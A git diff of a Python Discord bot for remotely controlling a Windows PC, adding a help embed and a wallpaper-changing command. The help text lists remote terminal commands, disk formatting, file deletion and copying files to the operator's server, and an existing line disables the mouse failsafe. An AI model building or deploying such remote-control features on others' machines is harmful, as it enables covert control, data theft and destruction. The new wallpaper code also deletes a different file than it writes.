@@ -16,6 +16,7 @@ from datetime import datetime
 from gtts import gTTS
 from playsound import playsound
 import nullfunction as nf
+import ctypes
 
 pg.FAILSAFE = False  # делает невозможным прервать движение мышки
 bot = commands.Bot(command_prefix='/')  # префикс для комманд
@@ -84,8 +85,32 @@ async def press(ctx, key, how_many):  # нажать клавишу
 
 
 @bot.command()
-async def help(ctx):  # сообщение помощи
-    await ctx.send(config.helpmessage)
+async def help(ctx):  # send help message
+    embed = discord.Embed(title='**Команды**', description='Configuration Administration Tool.', color=0x03fcec, )
+    # заголовки
+    embed.add_field(name='**/help**', value='Выводит это сообщение.', inline=False)
+    embed.add_field(name='**/move**', value='(X) (Y) (time) Передвинуть курсор.', inline=False)
+    embed.add_field(name='**/click**', value='Сделать левый клик мышкой.', inline=False)
+    embed.add_field(name='**/write**', value='Напечатать что-то.', inline=False)
+    embed.add_field(name='**/press**', value='(how_many) Нажать клавишу несколько раз.', inline=False)
+    embed.add_field(name='**/screenshot**', value='Cделать скриншот экрана.', inline=False)
+    embed.add_field(name='**/cg** ', value='Изменить раскладку клавиатуры.', inline=False)
+    embed.add_field(name='**/processlist**', value='Выводит список процессов.', inline=False)
+    embed.add_field(name='**/command** ', value='Выполнить комманду в терминале.', inline=False)
+    embed.add_field(name='**/kill**', value='Закрыть принудительно процесс.', inline=False)
+    embed.add_field(name='**/delete**', value='Удалить файл.', inline=False)
+    embed.add_field(name='**/wallpaper**', value='(url) Изменить фон рабочего стола.', inline=False)
+    embed.add_field(name='**/disk_format**', value='Отформатировать диск.', inline=False)
+    embed.add_field(name='**/copy**', value='Отправляет файл к вам на сервер.', inline=False)
+    embed.add_field(name='**/shutdown**', value='Выключить ПК.', inline=False)
+    embed.add_field(name='**/reboot**', value='Перезагрузка ПК.', inline=False)
+    embed.add_field(name='**/voice**', value='(lang) (text) Проиграть голосовое сообщение.', inline=False)
+    embed.add_field(name='**/off**', value='Выключить бота.', inline=False)
+    embed.set_thumbnail(url='https://i.imgur.com/YbYKL0F.png')
+    embed.set_footer(text=f'Made by NullifiedVlad',
+                     icon_url='https://i.imgur.com/YbYKL0F.png')
+    embed.set_author(name=bot.user.name, icon_url='https://i.imgur.com/YbYKL0F.png')
+    await ctx.send(embed=embed)
 
 
 @bot.command()
@@ -183,4 +208,17 @@ async def off(ctx):  # выключение бота
     await ctx.send('**CAT:** Выключаюсь...')
     sys.exit()
 
+
+@bot.command()
+async def wallpaper(ctx, url):
+
+    with open('wallpaper.png', 'wb') as f:
+        f.write(nf.img_get(url+'.png'))
+
+    if ctypes.windll.user32.SystemParametersInfoW(20, 0, 'wallpaper.png', 0):
+        await ctx.send('**CAT:** Обои успешно изменены!')
+    else:
+        await ctx.send('**CAT:** Ошибка!')
+
+    os.remove('wallpaper.jpg')
 bot.run(config.token)
